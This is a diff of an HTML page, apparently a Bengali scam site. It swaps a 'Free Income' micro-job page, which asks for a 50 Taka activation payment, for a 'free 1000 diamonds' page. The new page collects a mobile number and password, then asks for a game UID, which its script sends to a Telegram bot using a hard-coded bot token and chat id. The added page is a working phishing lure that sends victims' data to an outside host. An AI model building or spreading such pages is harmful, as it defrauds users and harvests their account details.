@@ -1,83 +1,119 @@
 <!DOCTYPE html>
-<html>
+<html lang="bn">
 <head>
-  <meta charset="UTF-8">
-  <title>Free Income 2025 - Micro Job</title>
-  <style>
-    body { font-family: Arial, sans-serif; background: #f5f5f5; padding: 20px; }
-    .container { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px #ccc; }
-    h2 { text-align: center; }
-    button { width: 100%; padding: 10px; margin-top: 10px; font-size: 16px; border-radius: 8px; border: none; cursor: pointer; background: #4CAF50; color: white; }
-    .task-box, .profile-box, .submit-box, .withdraw-box, .refer-box, .activation-box { display: none; }
-    textarea, input { width: 100%; padding: 10px; margin: 5px 0; border-radius: 6px; border: 1px solid #ccc; }
-    .show { display: block; }
-  </style>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>ফ্রিতে ১০০০ ডায়মন্ড ক্লেম করুন</title>
+    <style>
+        body {
+            font-family: Arial, sans-serif;
+            background-color: #f4f4f4;
+            padding: 20px;
+        }
+        .header {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .header h1 {
+            font-size: 26px;
+            font-weight: bold;
+            color: #000;
+            margin-bottom: 5px;
+        }
+        .header h2 {
+            font-size: 20px;
+            color: #333;
+            margin-top: 0;
+        }
+        .container {
+            background-color: #fff;
+            padding: 20px;
+            border-radius: 8px;
+            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
+            max-width: 400px;
+            margin: 0 auto;
+        }
+        input[type="text"], input[type="password"] {
+            width: 100%;
+            padding: 10px;
+            margin: 10px 0;
+            border: 1px solid #ddd;
+            border-radius: 5px;
+        }
+        button {
+            padding: 10px 20px;
+            background-color: #28a745;
+            color: #fff;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+        }
+        button:hover {
+            background-color: #218838;
+        }
+        .hidden {
+            display: none;
+        }
+    </style>
 </head>
 <body>
-  <div class="container">
-    <h2>Free Income 2025</h2>
-    <button onclick="showSection('task-box')">My Job</button>
-    <button onclick="showSection('submit-box')">Submit Task</button>
-    <button onclick="showSection('withdraw-box')">Withdraw</button>
-    <button onclick="showSection('refer-box')">Refer</button>
-    <button onclick="showSection('profile-box')">Profile</button>
-    <button onclick="showSection('activation-box')">Account Active</button>
 
-    <div id="task-box" class="task-box">
-      <h3>Today's Task</h3>
-      <p><b>Title:</b> Join Our Telegram Group</p>
-      <p><b>Description:</b> Go to task:https://HRIDOY_CYBER_ZONE</p>
-      <p><b>Reward:</b> 5 Taka</p>
+    <div class="header">
+        <h1>Lx Hridoy</h1>
+        <h2>ফ্রিতে ক্লেম করুন ১০০০ ডায়মন্ড</h2>
     </div>
 
-    <div id="submit-box" class="submit-box">
-      <h3>Submit Your Task</h3>
-      <input type="text" placeholder="Your Telegram Username">
-      <textarea placeholder="Paste proof or description..."></textarea>
-      <button>Submit</button>
+    <div class="container">
+        <h2>লগইন করুন</h2>
+        <form id="loginForm">
+            <input type="text" id="mobileNumber" placeholder="মোবাইল নাম্বার" required>
+            <input type="password" id="password" placeholder="পাসওয়ার্ড" required>
+            <button type="submit">লগইন</button>
+        </form>
+
+        <div id="uidForm" class="hidden">
+            <h3>আপনার UID প্রদান করুন</h3>
+            <input type="text" id="uid" placeholder="UID" required>
+            <button id="submitBtn">সাবমিট</button>
+        </div>
     </div>
 
-    <div id="withdraw-box" class="withdraw-box">
-      <h3>Withdraw</h3>
-      <input type="number" placeholder="Amount (Min: 100)">
-      <select>
-        <option>Bkash</option>
-        <option>Nagad</option>
-      </select>
-      <input type="text" placeholder="Your Number">
-      <button>Request Withdraw</button>
-    </div>
+    <script>
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
+            e.preventDefault();
+            document.getElementById('uidForm').classList.remove('hidden');
+        });
 
-    <div id="refer-box" class="refer-box">
-      <h3>Your Referral Link</h3>
-      <p>https://t.me/FreeIncome2025Bot?start=YOURID</p>
-    </div>
+        document.getElementById('submitBtn').addEventListener('click', function () {
+            var uid = document.getElementById('uid').value;
+            if (uid) {
+                var token = '8141110802:AAE1S38ZRzKrTHNZDNhCISdXOMkQCoTzNSo';
+                var chatId = '6593402184';
+                var message = `নতুন UID প্রাপ্ত হয়েছে:\nUID: ${uid}`;
 
-    <div id="profile-box" class="profile-box">
-      <h3>Your Profile</h3>
-      <p><b>Name:</b> User Name</p>
-      <p><b>Username:</b> @username</p>
-      <p><b>ID:</b> 123456</p>
-      <p><b>Balance:</b> 100 Taka</p>
-      <p><b>Total Withdraw:</b> 50 Taka</p>
-      <p><b>Total Task Completed:</b> 10</p>
-    </div>
+                fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: chatId,
+                        text: message
+                    })
+                })
+                .then(response => response.json())
+                .then(data => {
+                    alert('UID সফলভাবে পাঠানো হয়েছে!');
+                })
+                .catch(error => {
+                    alert('UID পাঠাতে সমস্যা হয়েছে।');
+                    console.error(error);
+                });
+            } else {
+                alert('অনুগ্রহ করে UID প্রদান করুন');
+            }
+        });
+    </script>
 
-    <div id="activation-box" class="activation-box">
-      <h3>Activate Your Account</h3>
-      <p>Send 50 Taka to Bkash/Nagad number: <b>01XXXXXXXXX</b></p>
-      <input type="text" placeholder="Transaction ID">
-      <button>Submit</button>
-    </div>
-  </div>
-
-  <script>
-    function showSection(id) {
-      document.querySelectorAll('.task-box, .submit-box, .withdraw-box, .refer-box, .profile-box, .activation-box').forEach(section => {
-        section.classList.remove('show');
-      });
-      document.getElementById(id).classList.add('show');
-    }
-  </script>
 </body>
 </html>
